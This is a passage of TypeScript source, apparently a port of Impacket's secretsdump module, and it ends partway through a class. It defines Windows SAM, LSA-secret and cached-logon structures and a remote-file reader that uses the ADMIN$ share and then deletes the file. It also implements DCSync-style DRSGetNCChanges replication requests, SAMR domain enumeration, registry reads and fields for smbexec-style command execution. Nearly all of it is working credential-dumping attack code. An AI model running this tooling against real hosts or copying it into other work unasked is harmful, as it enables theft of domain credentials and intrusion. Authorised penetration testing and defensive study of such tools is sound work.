// Impacket-js - secretsdump core logic module
// Ported from impacket/examples/secretsdump.py
//
// Performs various techniques to dump hashes from the remote machine
// without executing any agent there.

import * as fs from 'node:fs';
import * as path from 'node:path';
import * as nodeCrypto from 'node:crypto';

import { Structure } from '@impacket/structure';
import type { FieldDescriptor } from '@impacket/structure';
import { hexdump } from '@impacket/structure';
import { transformKey, rc4 as rc4Encrypt, md4 as md4Hash, desEcbDecryptBlock, desEcbEncryptBlock } from '@impacket/crypto';
import { lmowfV1, ntowfV1 } from '@impacket/ntlm';
import { ESENT_DB, getUnixTime } from '@impacket/ese';
import type { RemoteFile as EseRemoteFile } from '@impacket/ese';
import { getRegistryParser } from '@impacket/winregistry';
import { DPAPI_SYSTEM } from '@impacket/dpapi';
import {
  DCERPCTransportFactory,
  MSRPC_UUID_DRSUAPI,
  DRSBind,
  DRS_EXTENSIONS_INT,
  DRSGetNCChanges,
  DS_NAME_FORMAT,
  DSNAME,
  PARTIAL_ATTR_VECTOR_V1_EXT,
  NTDSAPI_CLIENT_GUID,
  NULLGUID,
  DRS_EXT_GETCHGREQ_V6,
  DRS_EXT_GETCHGREPLY_V6,
  DRS_EXT_GETCHGREQ_V8,
  DRS_EXT_STRONG_ENCRYPTION,
  DRS_EXT_NONDOMAIN_NCS,
  DRS_INIT_SYNC,
  DRS_WRIT_REP,
  EXOP_REPL_OBJ,
  makeAttid,
  oidFromAttid,
  PrefixTableEntry,
  hDRSDomainControllerInfo,
  hDRSCrackNames,
  decryptAttributeValue,
  removeDESLayer,
  MSRPC_UUID_RRP,
  hOpenLocalMachine,
  hBaseRegOpenKey,
  hBaseRegQueryValue,
  hBaseRegQueryInfoKey,
  hBaseRegCloseKey,
  hBaseRegCreateKey,
  hBaseRegSaveKey,
  MSRPC_UUID_SCMR,
  hROpenSCManagerW,
  hROpenServiceW,
  hRCreateServiceW,
  hRStartServiceW,
  hRDeleteService,
  hRControlService,
  hRCloseServiceHandle,
  hRQueryServiceStatus,
  hRQueryServiceConfigW,
  hRChangeServiceConfigW,
  SERVICE_STOPPED,
  SERVICE_RUNNING,
  SERVICE_CONTROL_STOP,
  MSRPC_UUID_SAMR,
  hSamrConnect,
  hSamrLookupDomainInSamServer,
  hSamrOpenDomain,
  hSamrEnumerateUsersInDomain,
  hSamrEnumerateGroupsInDomain,
  hSamrEnumerateAliasesInDomain,
  hSamrOpenGroup,
  hSamrGetMembersInGroup,
  hSamrOpenAlias,
  hSamrGetMembersInAlias,
  USER_NORMAL_ACCOUNT,
  USER_WORKSTATION_TRUST_ACCOUNT,
  USER_SERVER_TRUST_ACCOUNT,
  USER_INTERDOMAIN_TRUST_ACCOUNT,
  USER_PROPERTIES,
  USER_PROPERTY,
  KERB_STORED_CREDENTIAL_NEW,
  KERB_KEY_DATA_NEW,
  UF_ACCOUNTDISABLE,
  MSRPC_UUID_WKST,
  hNetrWkstaGetInfo,
  heptMap,
  RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  RPC_C_AUTHN_GSS_NEGOTIATE,
  DCERPCException,
  NULL,
} from '@impacket/dcerpc';
import type { DCERPC_v5 } from '@impacket/dcerpc';
import { SMBConnection } from '@impacket/smb-connection';
import { FILE_READ_DATA, FILE_SHARE_READ } from '@impacket/smb3';
import { STATUS_MORE_ENTRIES } from '@impacket/nt-errors';
import { ERROR_MESSAGES } from '@impacket/system-errors';
import { stringToBin } from '@impacket/uuid';
import * as krb5 from '@impacket/krb5';

import * as LOG from './logger.js';

// ---------------------------------------------------------------------------
// Structures
// ---------------------------------------------------------------------------

export class SAM_KEY_DATA extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Revision', '<L=0'],
    ['Length', '<L=0'],
    ['Salt', '16s=b""'],
    ['Key', '16s=b""'],
    ['CheckSum', '16s=b""'],
    ['Reserved', '<Q=0'],
  ];
}

export class SAM_HASH extends Structure {
  static override structure: FieldDescriptor[] = [
    ['PekID', '<H=0'],
    ['Revision', '<H=0'],
    ['Hash', '16s=b""'],
  ];
}

export class SAM_KEY_DATA_AES extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Revision', '<L=0'],
    ['Length', '<L=0'],
    ['CheckSumLen', '<L=0'],
    ['DataLen', '<L=0'],
    ['Salt', '16s=b""'],
    ['Data', ':'],
  ];
}

export class SAM_HASH_AES extends Structure {
  static override structure: FieldDescriptor[] = [
    ['PekID', '<H=0'],
    ['Revision', '<H=0'],
    ['DataOffset', '<L=0'],
    ['Salt', '16s=b""'],
    ['Hash', ':'],
  ];
}

export class DOMAIN_ACCOUNT_F extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Revision', '<L=0'],
    ['Unknown', '<L=0'],
    ['CreationTime', '<Q=0'],
    ['DomainModifiedCount', '<Q=0'],
    ['MaxPasswordAge', '<Q=0'],
    ['MinPasswordAge', '<Q=0'],
    ['ForceLogoff', '<Q=0'],
    ['LockoutDuration', '<q=0'],
    ['LockoutObservationWindow', '<Q=0'],
    ['ModifiedCountAtLastPromotion', '<Q=0'],
    ['NextRid', '<L=0'],
    ['PasswordProperties', '<L=0'],
    ['MinPasswordLength', '<H=0'],
    ['PasswordHistoryLength', '<H=0'],
    ['LockoutThreshold', '<H=0'],
    ['Unknown2', '<H=0'],
    ['ServerState', '<L=0'],
    ['ServerRole', '<H=0'],
    ['UasCompatibilityRequired', '<H=0'],
    ['Unknown3', '<Q=0'],
    ['Key0', ':'],
  ];
}

export class DOMAIN_ACCOUNT_V extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Randomstuffforfun', '<L=0'],
    ['SystemSid', '12s=b""'],
    ['Data', ':'],
  ];
}

export class USER_ACCOUNT_C extends Structure {
  static override structure: FieldDescriptor[] = [
    ['GroupNumber', '<L=0'],
    ['Unknown', '436s=b""'],
    ['GroupMembers', ':'],
  ];
}

export class USER_ACCOUNT_F extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Unknown', '8s=b""'],
    ['LastLogonTimestamp', '8s=b""'],
    ['Unknown2', '8s=b""'],
    ['PasswordLastSetTimeStamp', '8s=b""'],
    ['AccountExpiresTimeStamp', '8s=b""'],
    ['LastIncorrectPasswordTimestamp', '8s=b""'],
    ['UserNumber', '<L=0'],
    ['Unknown3', '<L=0'],
    ['GroupedData', '<H=0'],
    ['Unknown4', '<H=0'],
    ['CountryCode', '<H=0'],
    ['Unknown5', '<H=0'],
    ['InvalidPWDCount', '<H=0'],
    ['NumberOfLogons', '<H=0'],
    ['Unknown6', '<L=0'],
    ['Unknown7', '8s=b""'],
  ];
}

export class USER_ACCOUNT_V extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Unknown', '12s=b""'],
    ['NameOffset', '<L=0'],
    ['NameLength', '<L=0'],
    ['Unknown2', '<L=0'],
    ['FullNameOffset', '<L=0'],
    ['FullNameLength', '<L=0'],
    ['Unknown3', '<L=0'],
    ['CommentOffset', '<L=0'],
    ['CommentLength', '<L=0'],
    ['Unknown3b', '<L=0'],
    ['UserCommentOffset', '<L=0'],
    ['UserCommentLength', '<L=0'],
    ['Unknown4', '<L=0'],
    ['Unknown5', '12s=b""'],
    ['HomeDirOffset', '<L=0'],
    ['HomeDirLength', '<L=0'],
    ['Unknown6', '<L=0'],
    ['HomeDirConnectOffset', '<L=0'],
    ['HomeDirConnectLength', '<L=0'],
    ['Unknown7', '<L=0'],
    ['ScriptPathOffset', '<L=0'],
    ['ScriptPathLength', '<L=0'],
    ['Unknown8', '<L=0'],
    ['ProfilePathOffset', '<L=0'],
    ['ProfilePathLength', '<L=0'],
    ['Unknown9', '<L=0'],
    ['WorkstationsOffset', '<L=0'],
    ['WorkstationsLength', '<L=0'],
    ['Unknown10', '<L=0'],
    ['HoursAllowedOffset', '<L=0'],
    ['HoursAllowedLength', '<L=0'],
    ['Unknown11', '<L=0'],
    ['Unknown12', '12s=b""'],
    ['LMHashOffset', '<L=0'],
    ['LMHashLength', '<L=0'],
    ['Unknown13', '<L=0'],
    ['NTHashOffset', '<L=0'],
    ['NTHashLength', '<L=0'],
    ['Unknown14', '<L=0'],
    ['Unknown15', '24s=b""'],
    ['Data', ':'],
  ];
}

export class BUILTIN_GROUP_C extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Unknown1', '16s=b""'],
    ['NameOffset', '<L=0'],
    ['NameLength', '<L=0'],
    ['Unknown2', '<L=0'],
    ['CommentOffset', '<L=0'],
    ['CommentLength', '<L=0'],
    ['Unknown3', '<L=0'],
    ['UsersOffset', '<L=0'],
    ['Unknown4', '<L=0'],
    ['UserCount', '<L=0'],
    ['Data', ':'],
  ];
}

export class NL_RECORD extends Structure {
  static override structure: FieldDescriptor[] = [
    ['UserLength', '<H=0'],
    ['DomainNameLength', '<H=0'],
    ['EffectiveNameLength', '<H=0'],
    ['FullNameLength', '<H=0'],
    ['LogonScriptName', '<H=0'],
    ['ProfilePathLength', '<H=0'],
    ['HomeDirectoryLength', '<H=0'],
    ['HomeDirectoryDriveLength', '<H=0'],
    ['UserId', '<L=0'],
    ['PrimaryGroupId', '<L=0'],
    ['GroupCount', '<L=0'],
    ['logonDomainNameLength', '<H=0'],
    ['unk0', '<H=0'],
    ['LastWrite', '<Q=0'],
    ['Revision', '<L=0'],
    ['SidCount', '<L=0'],
    ['Flags', '<L=0'],
    ['unk1', '<L=0'],
    ['LogonPackageLength', '<L=0'],
    ['DnsDomainNameLength', '<H=0'],
    ['UPN', '<H=0'],
    ['IV', '16s=b""'],
    ['CH', '16s=b""'],
    ['EncryptedData', ':'],
  ];
}

export class SAMR_RPC_SID_IDENTIFIER_AUTHORITY extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Value', '6s'],
  ];
}

export class SAMR_RPC_SID extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Revision', '<B'],
    ['SubAuthorityCount', '<B'],
    ['IdentifierAuthority', ':', SAMR_RPC_SID_IDENTIFIER_AUTHORITY],
    ['SubLen', '_-SubAuthority', 'self["SubAuthorityCount"]*4'],
    ['SubAuthority', ':'],
  ];

  formatCanonical(): string {
    const authValue = this.get('IdentifierAuthority') as SAMR_RPC_SID_IDENTIFIER_AUTHORITY;
    const authBuf = authValue.get('Value') as Buffer;
    const revision = Number(this.get('Revision'));
    let ans = `S-${revision}-${authBuf[5]!}`;
    const subAuth = this.get('SubAuthority') as Buffer;
    const count = Number(this.get('SubAuthorityCount'));
    for (let i = 0; i < count; i++) {
      ans += `-${subAuth.readUInt32BE(i * 4)}`;
    }
    return ans;
  }
}

export class LSA_SECRET_BLOB extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Length', '<L=0'],
    ['Unknown', '12s=b""'],
    ['_Secret', '_-Secret', 'self["Length"]'],
    ['Secret', ':'],
    ['Remaining', ':'],
  ];
}

export class LSA_SECRET extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Version', '<L=0'],
    ['EncKeyID', '16s=b""'],
    ['EncAlgorithm', '<L=0'],
    ['Flags', '<L=0'],
    ['EncryptedData', ':'],
  ];
}

export class LSA_SECRET_XP extends Structure {
  static override structure: FieldDescriptor[] = [
    ['Length', '<L=0'],
    ['Version', '<L=0'],
    ['_Secret', '_-Secret', 'self["Length"]'],
    ['Secret', ':'],
  ];
}

// ---------------------------------------------------------------------------
// Helper to create files for exporting
// ---------------------------------------------------------------------------

export type OpenFileFunc = (fileName: string, mode: string) => fs.WriteStream;

export function openFile(
  fileName: string,
  mode = 'w+',
  openFileFunc?: OpenFileFunc,
): fs.WriteStream {
  if (openFileFunc) {
    return openFileFunc(fileName, mode);
  }
  const flags = mode.includes('a') ? 'a' : 'w';
  return fs.createWriteStream(fileName, { flags, encoding: 'utf-8' });
}

// ---------------------------------------------------------------------------
// Helper: sleep
// ---------------------------------------------------------------------------

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ---------------------------------------------------------------------------
// Helper: ntpath.join (Windows-style)
// ---------------------------------------------------------------------------

function ntpathJoin(...parts: string[]): string {
  return parts.join('\\');
}

// ---------------------------------------------------------------------------
// Default print helper
// ---------------------------------------------------------------------------

function _printHelper(...args: unknown[]): void {
  console.log(args[args.length - 1]);
}

// ---------------------------------------------------------------------------
// RemoteFile
// ---------------------------------------------------------------------------

export class RemoteFile {
  private smbConnection: SMBConnection;
  private fileName: string;
  private tid: number;
  private fid: number | Buffer | null = null;
  private currentOffset = 0;

  constructor(smbConnection: SMBConnection, fileName: string) {
    this.smbConnection = smbConnection;
    this.fileName = fileName;
    this.tid = 0; // will be set in init
  }

  async init(): Promise<void> {
    this.tid = await this.smbConnection.connectTree('ADMIN$');
  }

  async open(): Promise<void> {
    let tries = 0;
    while (true) {
      try {
        this.fid = await this.smbConnection.openFile(
          this.tid,
          this.fileName,
          FILE_READ_DATA,
          FILE_SHARE_READ,
        );
        break;
      } catch (e: unknown) {
        const msg = String(e);
        if (msg.includes('STATUS_SHARING_VIOLATION')) {
          if (tries >= 3) throw e;
          await sleep(5000);
          tries++;
        } else {
          throw e;
        }
      }
    }
  }

  seek(offset: number, _whence: number): void {
    // whence 0 = from beginning
    this.currentOffset = offset;
  }

  async read(bytesToRead: number): Promise<Buffer> {
    if (bytesToRead > 0 && this.fid !== null) {
      const data = await this.smbConnection.readFile(
        this.tid,
        this.fid,
        this.currentOffset,
        bytesToRead,
      );
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      this.currentOffset += buf.length;
      return buf;
    }
    return Buffer.alloc(0);
  }

  async close(): Promise<void> {
    if (this.fid !== null) {
      await this.smbConnection.closeFile(this.tid, this.fid);
      this.fid = null;
    }
    try {
      await this.smbConnection.deleteFile('ADMIN$', this.fileName);
    } catch {
      // best-effort cleanup
    }
  }

  tell(): number {
    return this.currentOffset;
  }

  async readAll(): Promise<Buffer> {
    const chunks: Buffer[] = [];
    const chunkSize = 65536;
    while (true) {
      try {
        const chunk = await this.read(chunkSize);
        if (chunk.length === 0) break;
        chunks.push(chunk);
      } catch (e: any) {
        const msg = String(e);
        if (msg.includes('0xc0000011') || msg.includes('STATUS_END_OF_FILE')) {
          break;
        }
        throw e;
      }
    }
    return Buffer.concat(chunks);
  }

  toString(): string {
    return `\\\\${this.smbConnection.getRemoteHost()}\\ADMIN$\\${this.fileName}`;
  }
}

export class BufferFileIO {
  private data: Buffer;
  private pos = 0;

  constructor(data: Buffer) {
    this.data = data;
  }

  open(): void {}

  seek(offset: number, _whence: number): void {
    this.pos = offset;
  }

  read(size: number): Buffer {
    const end = Math.min(this.pos + size, this.data.length);
    const result = this.data.subarray(this.pos, end);
    this.pos = end;
    return result;
  }

  tell(): number {
    return this.pos;
  }

  close(): void {}
}

// ---------------------------------------------------------------------------
// RemoteOperations
// ---------------------------------------------------------------------------

export class RemoteOperations {
  private smbConnection: SMBConnection | null;
  private ldapConnection: any;
  private serviceName = 'RemoteRegistry';
  private stringBindingWinReg = String.raw`ncacn_np:445[\pipe\winreg]`;
  private rrp: DCERPC_v5 | null = null;
  private regHandle: any = null;

  private stringBindingSamr = String.raw`ncacn_np:445[\pipe\samr]`;
  private samr: DCERPC_v5 | null = null;
  private domainHandle: any = null;
  private domainName: string | null = null;
  private domainSid: string | null = null;

  private drsr: DCERPC_v5 | null = null;
  private hDrs: any = null;
  private ntdsDsaObjectGuid: any = null;
  private ppartialAttrSet: any = null;
  private prefixTable: any[] = [];
  private doKerberos: boolean;
  private kdcHost: string | null;

  private bootKey = Buffer.alloc(0);
  private disabled = false;
  private shouldStop = false;
  private started = false;

  private stringBindingSvcCtl = String.raw`ncacn_np:445[\pipe\svcctl]`;
  private scmr: DCERPC_v5 | null = null;
  private scManagerHandle: any = null;
  private serviceHandle: any = null;
  private tmpServiceName: string | null = null;
  private serviceDeleted = false;

  private batchFile = '%TEMP%\\execute.bat';
  private shell = '%COMSPEC% /Q /c ';
  private outputPath = '%SYSTEMROOT%\\Temp\\__output';
  private answerTMP = Buffer.alloc(0);

  private execMethod = 'smbexec';

  constructor(
    smbConnection: SMBConnection | null,
    doKerberos: boolean,
    kdcHost: string | null = null,
    ldapConnection: any = null,
  ) {
    this.smbConnection = smbConnection;
    if (this.smbConnection) {
      this.smbConnection.setTimeout(5 * 60);
    }
    this.ldapConnection = ldapConnection;
    this.doKerberos = doKerberos;
    this.kdcHost = kdcHost;
  }

  setExecMethod(method: string): void {
    this.execMethod = method;
  }

  private async connectSvcCtl(): Promise<void> {
    const rpc = DCERPCTransportFactory(this.stringBindingSvcCtl);
    (rpc as any).setSmbConnection(this.smbConnection!);
    this.scmr = rpc.getDceRpc();
    await this.scmr.connect();
    await this.scmr.bind(MSRPC_UUID_SCMR);
  }

  private async connectWinReg(): Promise<void> {
    const rpc = DCERPCTransportFactory(this.stringBindingWinReg);
    (rpc as any).setSmbConnection(this.smbConnection!);
    this.rrp = rpc.getDceRpc();
    await this.rrp.connect();
    await this.rrp.bind(MSRPC_UUID_RRP);
  }

  getRRP(): DCERPC_v5 | null {
    return this.rrp;
  }

  async connectSamr(domain: string): Promise<void> {
    const rpc = DCERPCTransportFactory(this.stringBindingSamr);
    (rpc as any).setSmbConnection(this.smbConnection!);
    this.samr = rpc.getDceRpc();
    await this.samr.connect();
    await this.samr.bind(MSRPC_UUID_SAMR);
    const resp = await hSamrConnect(this.samr) as any;
    const serverHandle = resp.get('ServerHandle');

    const lookupResp = await hSamrLookupDomainInSamServer(this.samr, serverHandle, domain) as any;
    this.domainSid = lookupResp.get('DomainId').formatCanonical();

    const openResp = await hSamrOpenDomain(this.samr, serverHandle, lookupResp.get('DomainId')) as any;
    this.domainHandle = openResp.get('DomainHandle');
    this.domainName = domain;
  }

  private async connectDrds(): Promise<void> {
    const stringBinding = await heptMap(
      this.smbConnection!.getRemoteHost(),
      MSRPC_UUID_DRSUAPI,
      undefined,
      'ncacn_ip_tcp',
    );
    const rpc = DCERPCTransportFactory(stringBinding!);
    rpc.setRemoteHost(this.smbConnection!.getRemoteHost());
    rpc.setRemoteName(this.smbConnection!.getRemoteName());
    const creds = this.smbConnection!.getCredentials();
    rpc.setCredentials(
      creds.user,
      creds.password,
      creds.domain,
      creds.lmhash as string,
      creds.nthash as string,
    );
    rpc.setKerberos(this.doKerberos, this.kdcHost);
    this.drsr = rpc.getDceRpc();
    this.drsr.setAuthLevel(RPC_C_AUTHN_LEVEL_PKT_PRIVACY);
    if (this.doKerberos) {
      this.drsr.setAuthType(RPC_C_AUTHN_GSS_NEGOTIATE);
    }
    await this.drsr.connect();
    await this.drsr.bind(MSRPC_UUID_DRSUAPI);

    if (this.domainName === null) {
      const transportCreds = rpc.getCredentials();
      this.domainName = transportCreds[2];
    }

    const request = new DRSBind();
    request.set('puuidClientDsa', NTDSAPI_CLIENT_GUID);
    const drs = new DRS_EXTENSIONS_INT();
    drs.set('cb', drs.getData().length);
    drs.set(
      'dwFlags',
      DRS_EXT_GETCHGREQ_V6 |
        DRS_EXT_GETCHGREPLY_V6 |
        DRS_EXT_GETCHGREQ_V8 |
        DRS_EXT_STRONG_ENCRYPTION |
        DRS_EXT_NONDOMAIN_NCS,
    );
    drs.set('SiteObjGuid', NULLGUID);
    drs.set('Pid', 0);
    drs.set('dwReplEpoch', 0);
    drs.set('dwFlagsExt', 0);
    drs.set('ConfigObjGUID', NULLGUID);
    drs.set('dwExtCaps', 0xffffffff);
    const pextClient = request.get('pextClient') as any;
    pextClient.set('cb', drs.getData().length);
    pextClient.set('rgb', Array.from(drs.getData()));
    let resp = await (this.drsr as any).request(request) as any;

    // Check dwReplEpoch
    const drsExtensionsInt = new DRS_EXTENSIONS_INT();
    const ppextServerObj = resp.get('ppextServer') as any;
    const rgb = ppextServerObj.get('rgb');
    const rgbBuf = Array.isArray(rgb) ? Buffer.from(rgb as number[]) : (rgb as Buffer);
    const ppextServer = Buffer.concat([
      rgbBuf,
      Buffer.alloc(Math.max(0, drsExtensionsInt.getData().length - (ppextServerObj.get('cb') as number))),
    ]);
    drsExtensionsInt.fromString(ppextServer);

    if (Number(drsExtensionsInt.get('dwReplEpoch')) !== 0) {
      LOG.debug(
        `DC's dwReplEpoch != 0, setting it to ${drsExtensionsInt.get('dwReplEpoch')} and calling DRSBind again`,
      );
      drs.set('dwReplEpoch', drsExtensionsInt.get('dwReplEpoch'));
      const pextClient2 = request.get('pextClient') as any;
      pextClient2.set('cb', drs.getData().length);
      pextClient2.set('rgb', Array.from(drs.getData()));
      resp = await (this.drsr as any).request(request) as any;
    }

    this.hDrs = resp.get('phDrs');

    // Get NtdsDsaObjectGuid
    const dcInfoResp = await hDRSDomainControllerInfo(this.drsr as any, this.hDrs, this.domainName!, 2) as any;
    if (dcInfoResp.get('pmsgOut').get('V2').get('cItems') > 0) {
      this.ntdsDsaObjectGuid = dcInfoResp.get('pmsgOut').get('V2').get('rItems')[0].get('NtdsDsaObjectGuid');
    } else {
      LOG.error(`Couldn't get DC info for domain ${this.domainName}`);
      throw new Error('Fatal, aborting');
    }
  }

  getSamr(): DCERPC_v5 | null {
    return this.samr;
  }

  getDrsr(): DCERPC_v5 | null {
    return this.drsr;
  }

  async DRSCrackNames(
    formatOffered: number = DS_NAME_FORMAT.enumValues['DS_DISPLAY_NAME']!,
    formatDesired: number = DS_NAME_FORMAT.enumValues['DS_FQDN_1779_NAME']!,
    name = '',
  ): Promise<any> {
    if (this.drsr === null) {
      await this.connectDrds();
    }
    LOG.debug(`Calling DRSCrackNames for ${name}`);
    const resp = await hDRSCrackNames(this.drsr! as any, this.hDrs, 0, formatOffered, formatDesired, [
      name,
    ]);
    return resp;
  }

  async DRSGetNCChangesGuid(userGuid: string): Promise<any> {
    const guidBuf = stringToBin(userGuid.replace(/[{}]/g, ''));
    const dsName = new DSNAME();
    dsName.set('SidLen', 0);
    (dsName.fields['Guid'] as any).set('Data', guidBuf);
    dsName.set('NameLen', 0);
    dsName.set('StringName', '\x00');
    dsName.set('structLen', dsName.getData().length);

    return this._DRSGetNCChanges(userGuid, dsName);
  }

  async DRSGetNCChangesSid(userSid: string): Promise<any> {
    // Convert string SID to packet SID
    const parts = userSid.split('-');
    const revision = parseInt(parts[1]!, 10);
    const authority = parseInt(parts[2]!, 10);
    const subAuthorities = parts.slice(3).map((p) => parseInt(p, 10));

    const packetSid = Buffer.alloc(8 + subAuthorities.length * 4);
    packetSid.writeUInt8(revision, 0);
    packetSid.writeUInt8(subAuthorities.length, 1);
    // IdentifierAuthority - 6 bytes big-endian
    packetSid.writeUInt8(0, 2);
    packetSid.writeUInt8(0, 3);
    packetSid.writeUInt8(0, 4);
    packetSid.writeUInt8(0, 5);
    packetSid.writeUInt8((authority >> 8) & 0xff, 6);
    packetSid.writeUInt8(authority & 0xff, 7);
    for (let i = 0; i < subAuthorities.length; i++) {
      packetSid.writeUInt32LE(subAuthorities[i]!, 8 + i * 4);
    }

    const dsName = new DSNAME();
    dsName.set('SidLen', packetSid.length);
    dsName.set('Guid', Buffer.alloc(16));
    dsName.set('Sid', packetSid);
    dsName.set('NameLen', 0);
    dsName.set('StringName', '\x00');
    dsName.set('structLen', dsName.getData().length);

    return this._DRSGetNCChanges(userSid, dsName);
  }

  private async _DRSGetNCChanges(userEntry: string, dsName: any): Promise<any> {
    if (this.drsr === null) {
      await this.connectDrds();
    }

    LOG.debug(`Calling DRSGetNCChanges for ${userEntry}`);
    const request = new DRSGetNCChanges();
    request.set('hDrs', this.hDrs);
    request.set('dwInVersion', 8);

    const pmsgIn = request.fields['pmsgIn'] as any;
    pmsgIn.set('tag', 8);
    const v8 = pmsgIn.fields['V8'] as any;
    v8.fields['uuidDsaObjDest'].set('Data', this.ntdsDsaObjectGuid);
    v8.fields['uuidInvocIdSrc'].set('Data', this.ntdsDsaObjectGuid);
    v8.fields['pNC'].fields['ReferentID'] = 1;
    v8.fields['pNC'].set('Data', dsName);
    v8.fields['usnvecFrom'].set('usnHighObjUpdate', 0);
    v8.fields['usnvecFrom'].set('usnHighPropUpdate', 0);
    v8.fields['pUpToDateVecDest'].fields['ReferentID'] = 0;
    v8.set('ulFlags', DRS_INIT_SYNC | DRS_WRIT_REP);
    v8.set('cMaxObjects', 1);
    v8.set('cMaxBytes', 0);
    v8.set('ulExtendedOp', EXOP_REPL_OBJ);

    if (this.ppartialAttrSet === null) {
      this.prefixTable = [];
      this.ppartialAttrSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
      this.ppartialAttrSet.set('dwVersion', 1);
      this.ppartialAttrSet.set('cAttrs', Object.keys(NTDSHashes.ATTRTYP_TO_ATTID).length);
      for (const attId of Object.values(NTDSHashes.ATTRTYP_TO_ATTID)) {
        (this.ppartialAttrSet.get('rgPartialAttr') as any[]).push(makeAttid(this.prefixTable, attId));
      }
    }

    v8.fields['pPartialAttrSet'].fields['ReferentID'] = 1;
    v8.fields['pPartialAttrSet'].set('Data', this.ppartialAttrSet);

    const ptDest = v8.fields['PrefixTableDest'];
    ptDest.set('PrefixCount', this.prefixTable.length);
    const pPrefixEntry = ptDest.fields['pPrefixEntry'];
    pPrefixEntry.fields['ReferentID'] = 1;
    const ptEntries: any[] = [];
    for (const entry of this.prefixTable) {
      const pte = new PrefixTableEntry();
      pte.set('ndx', entry.ndx);
      const oidT = pte.fields['prefix'] as any;
      oidT.set('length', entry.prefix.length);
      const elements = oidT.fields['elements'];
      elements.fields['ReferentID'] = 1;
      elements.fields['Data'].fields['Data'] = Array.from(entry.prefix.elements);
      ptEntries.push(pte);
    }
    pPrefixEntry.fields['Data'].fields['Data'] = ptEntries;

    v8.fields['pPartialAttrSetEx1'].fields['ReferentID'] = 0;

    return (this.drsr! as any).request(request);
  }

  async getDomainUsers(enumerationContext = 0): Promise<any> {
    if (this.samr === null) {
      await this.connectSamr((await this.getMachineNameAndDomain())[1]);
    }

    try {
      const resp = await hSamrEnumerateUsersInDomain(
        this.samr!,
        this.domainHandle,
        USER_NORMAL_ACCOUNT |
          USER_WORKSTATION_TRUST_ACCOUNT |
          USER_SERVER_TRUST_ACCOUNT |
          USER_INTERDOMAIN_TRUST_ACCOUNT,
        enumerationContext,
      );
      return resp;
    } catch (e: unknown) {
      if (e instanceof DCERPCException && String(e).includes('STATUS_MORE_ENTRIES')) {
        return (e as any).getPacket();
      }
      throw e;
    }
  }

  async getGroupsInDomain(): Promise<any> {
    try {
      return await hSamrEnumerateGroupsInDomain(this.samr!, this.domainHandle);
    } catch (e: unknown) {
      if (e instanceof DCERPCException && String(e).includes('STATUS_MORE_ENTRIES')) {
        return (e as any).getPacket();
      }
      throw e;
    }
  }

  async getAliasesInDomain(): Promise<any> {
    try {
      return await hSamrEnumerateAliasesInDomain(this.samr!, this.domainHandle);
    } catch (e: unknown) {
      if (e instanceof DCERPCException && String(e).includes('STATUS_MORE_ENTRIES')) {
        return (e as any).getPacket();
      }
      throw e;
    }
  }

  async getMembersInGroup(rid: number): Promise<any> {
    const ans = await hSamrOpenGroup(this.samr!, this.domainHandle, rid) as any;
    return hSamrGetMembersInGroup(this.samr!, ans.get('GroupHandle'));
  }

  async getMembersInAlias(rid: number): Promise<any> {
    const ans = await hSamrOpenAlias(this.samr!, this.domainHandle, rid) as any;
    return hSamrGetMembersInAlias(this.samr!, ans.get('AliasHandle'));
  }

  getDomainSid(): string | null {
    return this.domainSid;
  }

  getDomainHandle(): any {
    return this.domainHandle;
  }

  getMachineKerberosSalt(): Buffer {
    if (this.smbConnection!.getServerName() === '') {
      return Buffer.alloc(0);
    }
    const host = this.smbConnection!.getServerName();
    const domain = this.smbConnection!.getServerDNSDomainName();
    return Buffer.from(
      `${domain.toUpperCase()}host${host.toLowerCase()}.${domain.toLowerCase()}`,
      'utf-8',
    );
  }

  async getMachineNameAndDomain(): Promise<[string, string]> {
    if (this.smbConnection!.getServerName() === '') {
      const rpc = DCERPCTransportFactory(String.raw`ncacn_np:445[\pipe\wkssvc]`);
      (rpc as any).setSmbConnection(this.smbConnection!);
      const dce = rpc.getDceRpc();
      await dce.connect();
      await dce.bind(MSRPC_UUID_WKST);
      const resp = await hNetrWkstaGetInfo(dce as any, 100) as any;
      await dce.disconnect();
      const info = resp.get('WkstaInfo').get('WkstaInfo100');
      return [
        info.get('wki100_computername').slice(0, -1),
        info.get('wki100_langroup').slice(0, -1),
      ];
    }
    return [this.smbConnection!.getServerName(), this.smbConnection!.getServerDomain()];
  }

  getDNSDomain(): string {
    if (this.smbConnection!.getServerDNSDomainName() === '') {
      return '';
    }
    return this.smbConnection!.getServerDNSDomainName();
  }

  async getDefaultLoginAccount(): Promise<string | null> {
    try {
      const ans = await hBaseRegOpenKey(
        this.rrp! as any,
        this.regHandle,
        'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
      );
      const keyHandle = (ans as any).get('phkResult');
      const [, usernameVal] = await hBaseRegQueryValue(this.rrp! as any, keyHandle, 'DefaultUserName') as [number, any];
      const username = usernameVal.slice(0, -1);
      const [, domainVal] = await hBaseRegQueryValue(this.rrp! as any, keyHandle, 'DefaultDomainName') as [number, any];
      const domain = domainVal.slice(0, -1);
      await hBaseRegCloseKey(this.rrp! as any, keyHandle);
      if (domain.length > 0) {
        return `${domain}\\${username}`;
      }
      return username;
    } catch {
      return null;
    }
  }

  async getServiceAccount(serviceName: string): Promise<string | null> {
    try {
      const ans = await hROpenServiceW(this.scmr!, this.scManagerHandle, serviceName) as any;
      const serviceHandle = ans.get('lpServiceHandle');
      const resp = await hRQueryServiceConfigW(this.scmr!, serviceHandle) as any;
      let account: string = resp.get('lpServiceConfig').get('lpServiceStartName').slice(0, -1);
      await hRCloseServiceHandle(this.scmr!, serviceHandle);
      if (account.startsWith('.\\')) {
        account = account.substring(2);
      }
      return account;
    } catch (e: unknown) {
      if (!serviceName.endsWith('_history')) {
        LOG.error(String(e));
      }
      return null;
    }
  }

